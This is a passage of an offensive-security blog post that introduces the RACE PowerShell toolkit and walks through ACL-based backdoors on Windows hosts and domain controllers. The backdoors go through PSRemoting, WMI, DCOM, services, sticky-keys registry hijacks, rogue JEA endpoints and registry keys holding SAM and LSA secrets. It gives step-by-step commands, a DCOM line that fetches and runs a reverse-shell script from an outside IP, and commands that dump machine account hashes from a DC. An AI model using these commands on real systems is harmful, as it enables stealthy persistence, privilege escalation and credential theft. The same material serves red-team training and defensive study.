Do we actually need 'FullControl' to access the target machine using PowerShell Remoting? No! We can connect to the target machine by adding an ACE for a user which we control and provide it Read, Write and Execute permissions. This will allow the user to access the target machine using PSRemoting without admin privileges. Please note that the user's privileges on the target machine will not be elevated!<br />
<br />
This is what we are going to focus on. Some interesting backdoor/persistence techniques, some on-demand privilege escalation methods by modifying ACLs of various securable objects.<br />
<br />
<h4>
Introducing the RACE toolkit</h4>
To make it easy to execute ACL related attacks, I have written the RACE toolkit. RACE is dervied from Minimal <b>R</b>ights and <b>ACE</b>. You can find it on my GitHub : <a href="https://github.com/samratashok/RACE">https://github.com/samratashok/RACE</a><br />
<br />
RACE is a PowerShell module for executing ACL attacks against Windows targets. <br />
<br />
RACE uses the ActiveDirectory module for some of the attacks (Set-ADACL and Set-DCPermissions functions). You can get it from a machine where AD DS RSAT is available or from here: <a href="https://github.com/samratashok/ADModule">https://github.com/samratashok/ADModule</a></div>
<br />
<h4 style="text-align: justify;">
Persistence - PowerShell Remoting</h4>
<div style="text-align: justify;">
As we saw above, it is possible to access a target machine as a non-admin user using PSRemoting by modifying the ACL of the PSRemoting endpoint.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Using the below commands from RACE, we can modify the ACL of the default PSRemoting endpoint. Let's run it on the DC with DA privileges (please ignore 'I/O operation has been aborted'):</div>
</div>
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">. .\RACE.ps1

Set-RemotePSRemoting -ComputerName ops-dc -SamAccountName labuser &#8211;Verbose
</textarea></pre>
</div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
&nbsp;<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPHNKIW3TIuvI0c3tsNHpokdo5HbQnqSGVIGTH5uHUa40o3Y2UQl16e2BpnDzeeoxUr5zbq2EqyUX_azT6uIuq8FXkoYZWZ9Fs1DUlH9NvKQRwnuNUYK_Qg_YXcoMSJgzvo33z3i87WqE/s1600/Set-PSRemoting-DA.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="288" data-original-width="1461" height="76" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPHNKIW3TIuvI0c3tsNHpokdo5HbQnqSGVIGTH5uHUa40o3Y2UQl16e2BpnDzeeoxUr5zbq2EqyUX_azT6uIuq8FXkoYZWZ9Fs1DUlH9NvKQRwnuNUYK_Qg_YXcoMSJgzvo33z3i87WqE/s400/Set-PSRemoting-DA.png" width="400" /></a></div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div style="text-align: justify;">
Now, we will be able to access the target machine 'ops-dc' as labuser using PowerShell Remoting. Please note that the privileges will still be of labuser.</div>
<div style="text-align: justify;">
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Enter-PSSession -ComputerName ops-dc
</textarea></pre>
</div>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj17h924OsnLJSBZW9r_GZP5Uk9cEIx9oFiD_funJzyLsyvo755yIuuDy174dugfJbXoKQjuK8bmvMSoPO16MYvXDaOB0rVKezdpCfcLRCHIIC2sSvo0OBid-3GEF2Vn6Eiq65ydcp04js/s1600/Set-PSRemoting-labuser.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="534" data-original-width="1600" height="131" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj17h924OsnLJSBZW9r_GZP5Uk9cEIx9oFiD_funJzyLsyvo755yIuuDy174dugfJbXoKQjuK8bmvMSoPO16MYvXDaOB0rVKezdpCfcLRCHIIC2sSvo0OBid-3GEF2Vn6Eiq65ydcp04js/s400/Set-PSRemoting-labuser.png" width="400" /></a></div>
<div style="text-align: justify;">
Here is a video of the above attack: <br />
<iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/CqVV6Iqwsn0" width="560"></iframe><br />
<br />
<br />
There are no logs for the ACL modification of PowerShell endpoints. Although, when accessing the target machine there will be Events 4624 (Logon) and 4634 (Logoff). </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
How is this access useful? We can chain this with other modified permissions. We will come back to that later.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
UPDATE 29/02/2019 - Forgot to mention that this is useful against PowerShell Web Access too. If we have credentials of lab user and PSWA is enabled on the target machine, we can access the target machine using the credentials. </div>
<h4>
Persistence - WMI</h4>
<div style="text-align: justify;">
Similarly, we can modify ACLs to access a machine using WMI without admin privileges. In case of WMI, we need to modify ACLs for DCOM endpoint and also for namespaces. For namespaces, we can do it for all of them or only a specific one. The below command does it for all the namespaces:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-RemoteWMI -ComputerName ops-mssql -SamAccountName labuser &#8211;Verbose 

</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjueJNwfx4rR6sXE9sUqNWl5pVjkFcuOX9tP2178xh82_EPYYNHdvIKp3NJeouGStPpr0tJ1rkMMp9_L3otuJZ-716R6IwPY7zJlHBCIadkSOYIf59vkUH_ILRcZa3ezjPTeHcgKDC8tWg/s1600/WMI-DA.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="312" data-original-width="1457" height="85" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjueJNwfx4rR6sXE9sUqNWl5pVjkFcuOX9tP2178xh82_EPYYNHdvIKp3NJeouGStPpr0tJ1rkMMp9_L3otuJZ-716R6IwPY7zJlHBCIadkSOYIf59vkUH_ILRcZa3ezjPTeHcgKDC8tWg/s400/WMI-DA.png" width="400" /></a></div>
&nbsp;Now, we can simply run commands as 'labuser' on the target machine:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Invoke-WMIMethod -Class win32_process -Name Create -Argumentlist 'powershell -e base64encodedpayload'
</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx1pZm78hFxunA-Oc92nLONYeXI2aZt9fN8jrl7kVx8Lt49ky4BolMq706Wkyg_Vz5LpudGvWO2PHhfMRsvQznIsbpw_zwwF4hOHZ183wq1tlwgVapSI-lfRYm6lyXUZK-Ewdn0ARYTUM/s1600/WMI-labuser.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="445" data-original-width="1320" height="133" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx1pZm78hFxunA-Oc92nLONYeXI2aZt9fN8jrl7kVx8Lt49ky4BolMq706Wkyg_Vz5LpudGvWO2PHhfMRsvQznIsbpw_zwwF4hOHZ183wq1tlwgVapSI-lfRYm6lyXUZK-Ewdn0ARYTUM/s400/WMI-labuser.png" width="400" /></a></div>
</div>
<div style="text-align: justify;">
<b>WMI Permanent Event Consumers - </b>In my testing, with modified permissions to the root\subscription namespace it was possible to create permanent event consumers but the payload never executed. This is something which someone else can explore.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
</div>
<div style="text-align: justify;">
Like PSRemoting,&nbsp; there are no logs for ACL modification but logs 4624 and 4634 will be there when we use WMI to access the target machine.</div>
<div style="text-align: left;">
</div>
<h4 style="text-align: justify;">
<br />
On-demand Privilege Escalation - Windows Services</h4>
<div style="text-align: justify;">
Windows services are very useful for persistence AND getting admin privileges back.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Here is how we can abuse admin privileges with windows services: </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
- Initially with admin privileges, we can create new services or modify existing services to run as SYSTEM.&nbsp;</div>
<div style="text-align: justify;">
- We also modify ACLs of such services to allow permissions to config and restart for a user we control. </div>
<div style="text-align: justify;">
- As the user we control, reconfigure the target service on the target machine to change its executable path to our payload.&nbsp;</div>
<div style="text-align: justify;">
- Restart the service to execute the payload.&nbsp;</div>
<div style="text-align: justify;">
<br />
<b>Creating new service:</b></div>
<div style="text-align: justify;">
Use the below command to provide labuser GenericAll rights over scmanager (needs admin rights):</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-RemoteServicePermissions -SamAccountName labuser -ComputerName ops-build -ServiceName scmanager -Verbose
</textarea></pre>
<div style="text-align: left;">
</div>
<div style="text-align: left;">
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmek396a3jNTLqAHYR7yr3Uluq-TVmidVw72FDq4wehek6UqaWEG8NegEgrO_aDelA_vZ7lo43PdqybdKjocddGFFv60d6Im4XpFfr_mHmx5gBZq19gwnyzM-WYb2B611otv6JvPBQfg8/s1600/Set-RmeoteServices-SCManager.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="221" data-original-width="1439" height="61" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmek396a3jNTLqAHYR7yr3Uluq-TVmidVw72FDq4wehek6UqaWEG8NegEgrO_aDelA_vZ7lo43PdqybdKjocddGFFv60d6Im4XpFfr_mHmx5gBZq19gwnyzM-WYb2B611otv6JvPBQfg8/s400/Set-RmeoteServices-SCManager.png" width="400" /></a></div>
SCManager is a special service which provides the ability to create new services on a machine. After the above command, labuser can create services on the target machine:</div>
<div style="text-align: justify;">
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-RemoteServiceAbuse -ComputerName ops-build -UserName 'ops\labuser' -CreateService evilsvc -SamAccountName labuser -Verbose
</textarea></pre>
</div>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEge8kYOnlozGZigU4oWcLjpFe0-Di1oPPZaGK0ZXJYmwSUZLopxcP5A9-lyTl5NtH8qHnpFMqNv0c1no6hJX_dCQnZhCHoDZqbsDEO8NUQGrlWB8Hzf_sR8xiwyG5Uz0fhSgG74yCwYFpQ/s1600/Set-RmeoteServices-SCManager-labuser.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="189" data-original-width="1600" height="46" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEge8kYOnlozGZigU4oWcLjpFe0-Di1oPPZaGK0ZXJYmwSUZLopxcP5A9-lyTl5NtH8qHnpFMqNv0c1no6hJX_dCQnZhCHoDZqbsDEO8NUQGrlWB8Hzf_sR8xiwyG5Uz0fhSgG74yCwYFpQ/s400/Set-RmeoteServices-SCManager-labuser.png" width="400" /></a></div>
The above command sets the service start type to auto and the account to LocalSystem. The binpath or executable of the service is set to the specified payload. By default, the payload is to add the user specified by UserName parameter to the local administrators group.</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
After the above command, we can either wait for the service restart or a system reboot:</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
If you don't want to wait, run the below command (suggested by the tool) with admin privileges on the target machine to get restart permissions for the created service for our user: </div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-RemoteServicePermissions -SamAccountName labuser -ServiceName evilsvc -ComputerName ops-build -Verbose
</textarea></pre>
</div>
<div style="text-align: left;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJ6A_aEMIAffwF4gzjYk7Kqe7ugOOtFy4JVM1x6TM0n8vOgjGwVCPQ2JyoCQ1l1BKWtZ3Yim4MhIbCYONHuu0rYZhF7YmjwyDY3QJdxvGufylgA-nW27sNnXEd4jA-q5mWFzb9YWNZqaM/s1600/Set-RmeoteServices-SCManager-ACL.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="139" data-original-width="1437" height="37" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJ6A_aEMIAffwF4gzjYk7Kqe7ugOOtFy4JVM1x6TM0n8vOgjGwVCPQ2JyoCQ1l1BKWtZ3Yim4MhIbCYONHuu0rYZhF7YmjwyDY3QJdxvGufylgA-nW27sNnXEd4jA-q5mWFzb9YWNZqaM/s400/Set-RmeoteServices-SCManager-ACL.png" width="400" /></a></div>
<br />
<div style="text-align: justify;">
Now, when we restart the 'evilsvc' service, 'labuser' is added to the local administrators group on the target machine.</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">sc.exe \\ops-build start evilsvc 

</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
&nbsp;<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEnlfFHtKJhwT9T-1XHf0_ttHGbu0KrzZdLZXAg3V0bNfMWypTKquBlaXNJtUbSIu6SP82j5wyO3ZNob7zeD3Wp-MU5MCzEQT0UhFqJ4LclBvldAvV5j3s27H2dD44OCLwOvl1YPLKLhc/s1600/Set-RmeoteServices-SCManager-labuserlocaladm.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="448" data-original-width="1021" height="175" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEnlfFHtKJhwT9T-1XHf0_ttHGbu0KrzZdLZXAg3V0bNfMWypTKquBlaXNJtUbSIu6SP82j5wyO3ZNob7zeD3Wp-MU5MCzEQT0UhFqJ4LclBvldAvV5j3s27H2dD44OCLwOvl1YPLKLhc/s400/Set-RmeoteServices-SCManager-labuserlocaladm.png" width="400" /></a></div>
<br />
<b>Modifying existing service:</b> <br />
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
With admin equivalent permissions (CCDCLCSWRPWPDTLOCRSDRCWDWO) on any service, we can abuse it to escalate privileges. Please refer to the <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings">documentation</a> for a full list of the rights. </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The below command modifies the ACL of ALG service on the target machine to provide 'labuser' enough rights to configure and restart the service:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-RemoteServicePermissions -SamAccountName labuser -ComputerName ops-build -ServiceName ALG -Verbose
</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOsb5kEuLxBQVFpixkTrWdPBQekrZJML4pQ6KSj3SIdhCHyT4DPK6w-C4jRLM4Aqc8BMk5eDln2JKcI6HMtgoiSCLkmiwyvjB01JQnK73rhaOaqxn3_YkdXNUKI9M_K4XyVoMS3EoU3I0/s1600/Set-RmeoteServices-ALG.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="179" data-original-width="1440" height="48" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgOsb5kEuLxBQVFpixkTrWdPBQekrZJML4pQ6KSj3SIdhCHyT4DPK6w-C4jRLM4Aqc8BMk5eDln2JKcI6HMtgoiSCLkmiwyvjB01JQnK73rhaOaqxn3_YkdXNUKI9M_K4XyVoMS3EoU3I0/s400/Set-RmeoteServices-ALG.png" width="400" /></a></div>
Next, run the below command as labuser:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-RemoteServiceAbuse -ComputerName ops-build -UserName 'ops\labuser' -ServiceName ALG -Verbose 

</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m3x1NOVYOYBh9Z-equFt4_5q1F9rD9XKpRJ5aTPIYkdCh7BtOhRENwYUlFJYR-kXZHmh46PT8voPTQT9FLUoXwdCymLOQlr_URx5DW_OAWvXMASggVaDr2lmo0MvITiLgTn17bVqH48/s1600/Set-RmeoteServices-ALG-localadm.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="502" data-original-width="1562" height="127" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m3x1NOVYOYBh9Z-equFt4_5q1F9rD9XKpRJ5aTPIYkdCh7BtOhRENwYUlFJYR-kXZHmh46PT8voPTQT9FLUoXwdCymLOQlr_URx5DW_OAWvXMASggVaDr2lmo0MvITiLgTn17bVqH48/s400/Set-RmeoteServices-ALG-localadm.png" width="400" /></a></div>
<br />
Now, when we restart the ALG service, labuser is added to the local administrators group on the target machine.<br />
<br />
Below is a video of the attack:</div>
<iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/qIzyZhbnQ18" width="560"></iframe><br />
<br />
<div style="text-align: justify;">
<br />
I prefer using an existing service in place of creating a new one. <br />
<br /></div>
<div style="text-align: justify;">
Please note both the methods are verbose in the logs. Service creation, service configuration changes and service stop/start is logged. Therefore, this method is not recommended on DCs or when you want to be stealthy.&nbsp; </div>
</div>
<div style="text-align: left;">
</div>
</div>
<br />
<h4 style="text-align: left;">
On-demand Privilege Escalation - Registry Autoruns</h4>
<div style="text-align: justify;">
Windows registry is a very attractive target for persistence with on-demand privilege escalation. As a very simple example, let's have a look at Image File Execution Options which is a <a href="https://www.rapid7.com/db/modules/post/windows/manage/sticky_keys">popular</a> <a href="http://www.labofapenetrationtester.com/2012/05/fun-with-sticky-keys-utilman-and.html">method</a> of running a payload as SYSTEM using 'sticky keys'.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The idea is to modify the ACL of the Registry key responsible for Remote Registry (HKLM:\ SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg) and for sethc.exe (HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe) to be able to change registry remotely without needing admin privileges. To be able to trigger this remotely on a RDP logon session, NLA needs to be disabled by modifying (HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp).<br />
<br />
Run the below commands with admin privileges on the target machine to setup the registry key permissions:<br />
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">Set-RemoteRegistryPermissions -SamAccountName labuser -ComputerName ops-mssql -Verbose 

Set-RegistryImageFileExecution -SamAccountName labuser -ComputerName ops-mssql -Verbose 
</textarea></pre>
</div>
<br />
<div style="text-align: justify;">
Then run the below command as labuser to set payload for sethc and to disable NLA:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Invoke-RegistryAbuse -ComputerName ops-mssql -Method ImageFileExecution -Verbose 
</textarea></pre>
<div style="text-align: justify;">
Now, try to connect to the target machine using RDP and press the Shift key five times to get a command prompt with SYSTEM privileges!</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
The particular method we used is not very silent (even some AVs flag modification of Image File Execution Options registry key) and actually downgrades the security of the target machine. So please use this carefully in an actual operation.&nbsp; </div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Implementing some better registry key based command execution is something which is in future goals of the RACE tool.</div>
<br />
<h4 style="text-align: left;">
Persistence - DCOM</h4>
<div style="text-align: justify;">
We can modify the ACL of the DCOM endpoint (recall that we already did that while abusing WMI) for persistence. Like WMI, we will have command execution with the privileges of only the current user. But as we will see soon, something like that is very helpful when chained with other ACL modifications.&nbsp;</div>
<br />
<div style="text-align: justify;">
Run the below command with admin rights on the target machine to modify ACL of DCOM endpoint:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-DCOMPermissions -UserName labuser -ComputerName ops-mssql -Verbose 
</textarea></pre>
<div style="text-align: justify;">
Now, run the below command as labuser to execute commands using DCOM on the target machine. By default, the method used for execution is <a href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">MMC20.Application</a> class.</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Invoke-DCOMAbuse -ComputerName ops-build -Method MMC20 -Arguments 'iex(iwr -UseBasicParsing http://192.168.100.31:8080/Invoke-PowerShellTcp.ps1)' 
</textarea></pre>
<br />
<h4 style="text-align: left;">
On demand Privilege Escalation - Just Enough Administration (JEA)</h4>
<div style="text-align: justify;">
JEA is a PowerShell v5 feature which provides control over administrative tasks by providing PowerShell Remoting endpoint with:</div>
<div style="text-align: justify;">
- Virtual accounts - temporary local accounts which are local admin on member machines and DA on DCs but no rights to manage resources on network.&nbsp;</div>
<div style="text-align: justify;">
- Ability to limit the cmdlets and commands which a user can run through Role Capabilities.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
JEA is designed to 'allow non-admins to do some admin tasks' with 'least privileges'. This is precisely what we have been doing so far.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
So, JEA provides admin rights to anyone who is explicitly allowed to connect to the endpoint. But the control on those administrative rights is because of the commands and cmdlets they can execute as a JEA session starts in NoLanguage mode. Only explicitly allowed commands and cmdlets are allowed. It is possible to only allow a single command with only one parameter or argument allowed!</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
JEA endpoints also have transcripts enabled so that all the commands and their outputs are written to a flat text file. In addition to that, Event logs for 'WinRM Virtual Users\WinRM_VA_<i>AccountNumber</i>_<i>domain_username</i>' will be logged. PowerShell script block logging may also log any suspicious logs.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
With all these checks, how can we abuse JEA? Look at the <a href="https://docs.microsoft.com/en-us/powershell/jea/security-considerations">JEA Security Considerations</a> for some evil ideas ;)&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
With admin privileges on the target machine, we can Register a new JEA endpoint, allow all the cmdlets and commands and allow a user we control to connect to it. We can set the transcript log path to user's temp directory and clear the transcripts when we connect to the machine.&nbsp;</div>
<div style="text-align: justify;">
<br /></div>
<div style="text-align: justify;">
Let's use this against a DC. Run the below command with DA privileges to create a JEA Endpoint 'microsoft.powershell64' which allows access to labuser:</div>
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Set-JEAPermissions -ComputerName ops-dc -SamAccountName labuser -Verbose 
</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpyYY76yS1f7DXENfOtJXh4CO6csohyphenhypheneftPvzbdKlL-nmOgbgXMwGS82uFWz9GkG-KWzCCuyqrfo9fvcii9Wclabgc-iVfTHN6a6qhebBcZ-yyh9z28I66SNi4bshy7PVr_WwROP_V4W8/s1600/JEA-1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="512" data-original-width="1403" height="145" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpyYY76yS1f7DXENfOtJXh4CO6csohyphenhypheneftPvzbdKlL-nmOgbgXMwGS82uFWz9GkG-KWzCCuyqrfo9fvcii9Wclabgc-iVfTHN6a6qhebBcZ-yyh9z28I66SNi4bshy7PVr_WwROP_V4W8/s400/JEA-1.png" width="400" /></a></div>
&nbsp;Now, as labuser we can access the DC and get DA privileges for local context:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Enter-PSSession -ComputerName ops-dc -ConfigurationName microsoft.powershell64 
 
</textarea></pre>
</div>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiKZNAvnBwOHeoxv4oeJzevkFOjy3QQfF8o8wtPJUh1SoeNO9ozuPmsq9Rp-SL1RfkI2xM_xzO5sS1LqYAFmr7_6zfJeX9glJzmV3lfHrPKy0059USSaG0K-b22vcM3jD2unleVLEG6jA/s1600/JEA-2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="814" data-original-width="1098" height="296" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhiKZNAvnBwOHeoxv4oeJzevkFOjy3QQfF8o8wtPJUh1SoeNO9ozuPmsq9Rp-SL1RfkI2xM_xzO5sS1LqYAFmr7_6zfJeX9glJzmV3lfHrPKy0059USSaG0K-b22vcM3jD2unleVLEG6jA/s400/JEA-2.png" width="400" /></a></div>
Neat, isn't it!<br />
<br />
Below is a video of the attack:<br />
<iframe allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/D7mgKfPdxOg" width="560"></iframe><br />
<br />
<br />
Please note that there are no logs for new session registration. But, there are Events 4624, 4634 and 4717 when we access the target machine. Alos, keep in mind the PowerShell logs.<br />
<br />
The best way to avoid against JEA abuse really is to audit the registered session configurations and role capabilities. A good guidance on <a href="https://docs.microsoft.com/en-us/powershell/jea/audit-and-report">audit and report on JEA is here</a>. </div>
<div style="text-align: justify;">
</div>
<br />
<div style="text-align: justify;">
<h4>
Persistence - Registry</h4>
</div>
<div style="text-align: justify;">
Windows registry stores many interesting credentials - Machine account, Local users and Cached domain credentials. By modifying the ACL for the registry keys where we store these credentials, it is possible to access these credentials without needing admin privileges later on. We need to modify permissions of the following registry keys:<br />
- HKLM:\ SYSTEM\CurrentControlSet\Control\Lsa\ <br />
- HKLM:\Security\ <br />
- HKLM:\SAM\<br />
<br />
Once we have modified the ACLs of these keys, we can then modify ACL of Remote registyr, WMI or PowerShell Remoting to access the machine and extract the credentials.<br />
<br />
RACE uses code from the <a href="https://github.com/HarmJ0y/DAMP/">DAMP toolkit</a> for this:<br />
<br />
Use the below command to modify the permissions of the above registry keys and remote registry. We are targeting a DC so need DA privileges.:<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Add-RemoteRegBackdoor -ComputerName ops-dc -Trustee labuser -Verbose
</textarea></pre>
</div>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgU5O-l5nGUP337RWj0FYcKHPqdXudd7EJXrCONs5xTqn9hQEfU5Zz7hjGWq3RHIy9jXXuVZT7tUBKR2SAe5ptcYiUWOs4XqttsgWDMQMND3XPKkzoaxkVG43l9crQsygpvv8u4BHAp_IY/s1600/DAMP-DC.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="382" data-original-width="1439" height="105" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgU5O-l5nGUP337RWj0FYcKHPqdXudd7EJXrCONs5xTqn9hQEfU5Zz7hjGWq3RHIy9jXXuVZT7tUBKR2SAe5ptcYiUWOs4XqttsgWDMQMND3XPKkzoaxkVG43l9crQsygpvv8u4BHAp_IY/s400/DAMP-DC.png" width="400" /></a></div>
Now, use the below command to extract the machine account hash (uses remote registry):<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Get-RemoteMachineAccountHash -ComputerName ops-dc -Verbose
</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCRuSZJkxgK2BhqbREbAS18SWXHt86nUh_2GUYa-IOgaax_fc_ZYAOKg-drf2LiKkLx5nrVEuNAuoY1jCozMSayau9HgFsk4hWrTzxqhUQRVYUKXdskzngCO9rHGalZu7uFtpdKICq5PM/s1600/DAMP-labuser.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="180" data-original-width="1026" height="70" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCRuSZJkxgK2BhqbREbAS18SWXHt86nUh_2GUYa-IOgaax_fc_ZYAOKg-drf2LiKkLx5nrVEuNAuoY1jCozMSayau9HgFsk4hWrTzxqhUQRVYUKXdskzngCO9rHGalZu7uFtpdKICq5PM/s400/DAMP-labuser.png" width="400" /></a></div>
ICYMI, machine account of DC can run the DCSync attack!<br />
<br />
Use the Get-RemoteLocalAccountHash function to ectract local acccount hashes. In case of the DC, this gives the NTLM hash of the DSRM account<a href="https://www.blogger.com/null">!</a><br />
<br />
<br />
Remeber that we left a question - how modifying ACLs of PSRemoting is useful? This is a very good example. in case you cannot access remote registry (for example, filtered on firewall), you can modify the ACL of PSRemoting and the Registry keys and extract the secrets from the DC without admin privileges:<br />
<pre><textarea cols="70" readonly="readonly" rows="6" style="background-color: #012456; color: white;">$opsdc = New-PSSession -ComputerName ops-dc

Invoke-Command -FilePath C:\RACE-master\RACE.ps1 -Session $opsdc

Enter-PSSession $opsdc

Get-RemoteMachineAccountHash
</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
